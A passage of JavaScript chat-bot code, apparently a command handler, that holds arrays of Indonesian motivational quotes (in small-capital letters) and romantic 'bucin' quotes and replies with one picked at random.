"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
]
let motivasii = pickRandom(motivasi)
    payreply(`"${motivasii}"`)
}
break
case 'quotesbucin': {
const bucin = [
    "Aku memilih untuk sendiri, bukan karena menunggu yang sempurna, tetapi butuh yang tak pernah menyerah.",
    "Seorang yang single diciptakan bersama pasangan yang belum ditemukannya.",
    "Jomblo. Mungkin itu cara Tuhan untuk mengatakan 'Istirahatlah dari cinta yang salah'.",
    "Jomblo adalah anak muda yang mendahulukan pengembangan pribadinya untuk cinta yang lebih berkelas nantinya.",
    "Aku bukan mencari seseorang yang sempurna, tapi aku mencari orang yang menjadi sempurna berkat kelebihanku.",
    "Pacar orang adalah jodoh kita yang tertunda.",
    "Jomblo pasti berlalu. Semua ada saatnya, saat semua kesendirian menjadi sebuah kebersamaan dengannya kekasih halal. Bersabarlah.",
    "Romeo rela mati untuk juliet, Jack mati karena menyelamatkan Rose. Intinya, kalau tetap mau hidup, jadilah single.",
    "Aku mencari orang bukan dari kelebihannya tapi aku mencari orang dari ketulusan hatinya.",
    "Jodoh bukan sendal jepit, yang kerap tertukar. Jadi teruslah berada dalam perjuangan yang semestinya.",
    "Kalau kamu jadi senar gitar, aku nggak mau jadi gitarisnya. Karena aku nggak mau mutusin kamu.",
    "Bila mencintaimu adalah ilusi, maka izinkan aku berimajinasi selamanya.",
    "Sayang... Tugas aku hanya mencintaimu, bukan melawan takdir.",
    "Saat aku sedang bersamamu rasanya 1 jam hanya 1 detik, tetapi jika aku jauh darimu rasanya 1 hari menjadi 1 tahun.",
    "Kolak pisang tahu sumedang, walau jarak membentang cintaku takkan pernah hilang.",
    "Aku ingin menjadi satu-satunya, bukan salah satunya.",
    "Aku tidak bisa berjanji untuk menjadi yang baik. Tapi aku berjanji akan selalu mendampingi kamu.",
    "Kalau aku jadi wakil rakyat aku pasti gagal, gimana mau mikirin rakyat kalau yang selalu ada dipikiran aku hanyalah dirimu.",
    "Lihat kebunku, penuh dengan bunga. Lihat matamu, hatiku berbunga-bunga.",
    "Berjanjilah untuk terus bersamaku sekarang, esok, dan selamanya.",
    "Rindu tidak hanya muncul karena jarak yang terpisah. Tapi juga karena keinginan yang tidak terwujud.",
    "Kamu tidak akan pernah jauh dariku, kemanapun aku pergi kamu selalu ada, karena kamu selalu di hatiku, yang jauh hanya raga kita bukan hati kita.",
    "Aku tahu dalam setiap tatapanku, kita terhalang oleh jarak dan waktu. Tapi aku yakin kalau nanti kita pasti bisa bersatu.",
    "Merindukanmu tanpa pernah bertemu sama halnya dengan menciptakan lagu yang tak pernah ternyayikan.",
    "Ada kalanya jarak selalu menjadi penghalang antara aku sama kamu, namun tetap saja di hatiku kita selalu dekat.",
    "Jika hati ini tak mampu membendung segala kerinduan, apa daya tak ada yang bisa aku lakukan selain mendoakanmu.",
    "Mungkin di saat ini aku hanya bisa menahan kerinduan ini. Sampai tiba saatnya nanti aku bisa bertemu dan melepaskan kerinduan ini bersamamu.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Dalam dinginnya malam, tak kuingat lagi; Berapa sering aku memikirkanmu juga merindukanmu.",
    "Merindukanmu itu seperti hujan yang datang tiba-tiba dan bertahan lama. Dan bahkan setelah hujan reda, rinduku masih terasa.",
    "Sejak mengenalmu bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu.",
    "Tahu gak perbedaan pensi sama wajah kamu? Kalau pensil tulisannya bisa dihapus, tapi kalau wajah kamu gak akan ada yang bisa hapus dari pikiran aku.",
    "Bukan Ujian Nasional besok yang harus aku khawatirkan, tapi ujian hidup yang aku lalui setelah kamu meninggalkanku.",
    "Satu hal kebahagiaan di sekolah yang terus membuatku semangat adalah bisa melihat senyumanmu setiap hari.",
    "Kamu tahu gak perbedaanya kalau ke sekolah sama ke rumah kamu? Kalo ke sekolah pasti yang di bawa itu buku dan pulpen, tapi kalo ke rumah kamu, aku cukup membawa hati dan cinta.",
    "Aku gak sedih kok kalo besok hari senin, aku sedihnya kalau gak ketemu kamu.",
    "Momen cintaku tegak lurus dengan momen cintamu. Menjadikan cinta kita sebagai titik ekuilibrium yang sempurna.",
    "Aku rela ikut lomba lari keliling dunia, asalkan engkai yang menjadi garis finishnya.",
    "PR-ku adalah merindukanmu. Lebih kuat dari Matematika, lebih luas dari Fisika, lebih kerasa dari Biologi.",
    "Cintaku kepadamu itu bagaikan metabolisme, yang gak akan berhenti sampai mati.",
    "Kalau jelangkungnya kaya kamu, dateng aku jemput, pulang aku anter deh.",
    "Makan apapun aku suka asal sama kamu, termasuk makan ati.",
    "Cinta itu kaya hukuman mati. Kalau nggak ditembak, ya digantung.",
    "Mencintaimu itu kayak narkoba: sekali coba jadi candu, gak dicoba bikin penasaran, ditinggalin bikin sakaw.",
    "Gue paling suka ngemil karena ngemil itu enak. Apalagi ngemilikin kamu sepenuhnya...",
    "Dunia ini cuma milik kita berdua. Yang lainnya cuma ngontrak.",
    "Bagi aku, semua hari itu adalah hari Selasa. Selasa di Surga bila dekat denganmu...",
    "Bagaimana kalau kita berdua jadi komplotan penjahat? Aku curi hatimu dan kamu curi hatiku.",
    "Kamu itu seperti kopi yang aku seruput pagi ini. Pahit, tapi bikin nagih.",
    "Aku sering cemburu sama lipstikmu. Dia bisa nyium kamu tiap hari, dari pagi sampai malam.",
    "Hanya mendengar namamu saja sudah bisa membuatku tersenyum seperti orang bodoh.",
    "Aku tau teman wanitamu bukan hanya satu, dan menyukaimu pun bukan hanya aku.",
    "Semenjak aku berhenti berharap pada dirimu, aku jadi tidak semangat dalam segala hal..",
    "Denganmu, jatuh cinta adalah patah hati paling sengaja.",
    "Sangat sulit merasakan kebahagiaan hidup tanpa kehadiran kamu disisiku.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Sendainya kamu tahu, sampai saat ini aku masih mencintaimu.",
    "Terkadang aku iri sama layangan..talinya putus saja masih dikejar kejar dan gak rela direbut orang lain...",
    "Aku tidak tahu apa itu cinta, sampai akhirnya aku bertemu denganmu. Tapi, saat itu juga aku tahu rasanya patah hati.",
    "Mengejar itu capek, tapi lebih capek lagi menunggu\nMenunggu kamu menyadari keberadaanku...",
    "Jangan berhenti mencinta hanya karena pernah terluka. Karena tak ada pelangi tanpa hujan, tak ada cinta sejati tanpa tangisan.",
    "Aku punya sejuta alasan unutk melupakanmu, tapi tak ada yang bisa memaksaku untuk berhenti mencintaimu.",
    "Terkadang seseorang terasa sangat bodoh hanya untuk mencintai seseorang.",
    "Kamu adalah patah hati terbaik yang gak pernah aku sesali.",
    "Bukannya tak pantas ditunggu, hanya saja sering memberi harapan palsu.",
    "Sebagian diriku merasa sakit, Mengingat dirinya yang sangat dekat, tapi tak tersentuh.",
    "Hal yang terbaik dalam mencintai seseorang adalah dengan diam-diam mendo akannya.",
    "Kuharap aku bisa menghilangkan perasaan ini secepat aku kehilanganmu.",
    "Demi cinta kita menipu diri sendiri. Berusaha kuat nyatanya jatuh secara tak terhormat.",
    "Anggaplah aku rumahmu, jika kamu pergi kamu mengerti kemana arah pulang. Menetaplah bila kamu mau dan pergilah jika kamu bosan...",
    "Aku bingung, apakah aku harus kecewa atu tidak? Jika aku kecewa, emang siapa diriku baginya?\n\nKalau aku tidak kecewa, tapi aku menunggu ucapannya.",
    "Rinduku seperti ranting yang tetap berdiri.Meski tak satupun lagi dedaunan yang menemani, sampai akhirnya mengering, patah, dan mati.",
    "Kurasa kita sekarang hanya dua orang asing yang memiliki kenangan yang sama.",
    "Buatlah aku bisa membencimu walau hanya beberapa menit, agar tidak terlalu berat untuk melupakanmu.",
    "Aku mencintaimu dengan segenap hatiku, tapi kau malah membagi perasaanmu dengan orang lain.",
    "Mencintaimu mungkin menghancurkanku, tapi entah bagaimana meninggalkanmu tidak memperbaikiku.",
    "Kamu adalah yang utama dan pertama dalam hidupku. Tapi, aku adalah yang kedua bagimu.",
    "Jika kita hanya bisa dipertemukan dalam mimpi, aku ingin tidur selamanya.",
    "Melihatmu bahagia adalah kebahagiaanku, walaupun bahagiamu tanpa bersamaku.",
    "Aku terkadang iri dengan sebuah benda. Tidak memiliki rasa namun selalu dibutuhkan. Berbeda dengan aku yang memiliki rasa, namun ditinggalkan dan diabaikan...",
    "Bagaimana mungkin aku berpindah jika hanya padamu hatiku bersinggah?",
    "Kenangan tentangmu sudah seperti rumah bagiku. Sehingga setiap kali pikiranku melayang, pasti ujung-ujungnya akan selalu kembali kepadamu.",
    "Kenapa tisue bermanfaat? Karena cinta tak pernah kemarau. - Sujiwo Tejo",
    "Kalau mencintaimu adalah kesalahan, yasudah, biar aku salah terus saja.",
    "Sejak kenal kamu, aku jadi pengen belajar terus deh. Belajar jadi yang terbaik buat kamu.",
    "Ada yang bertingkah bodoh hanya untuk melihatmu tersenyum. Dan dia merasa bahagia akan hal itu.",
    "Aku bukan orang baik, tapi akan belajar jadi yang terbaik untuk kamu.",
    "Kita tidak mati, tapi lukanya yang membuat kita tidak bisa berjalan seperti dulu lagi.",
    "keberadaanmu bagaikan secangkir kopi yang aku butuhkan setiap pagi, yang dapat mendorongku untuk tetap bersemangat menjalani hari.",
    "Aku mau banget ngasih dunia ke kamu. Tapi karena itu nggak mungkin, maka aku akan kasih hal yang paling penting dalam hidupku, yaitu duniaku.",
    "Mending sing humoris tapi manis, ketimbang sok romantis tapi akhire tragis.",
    "Ben akhire ora kecewa, dewe kudu ngerti kapan waktune berharap lan kapan kudu mandeg.",
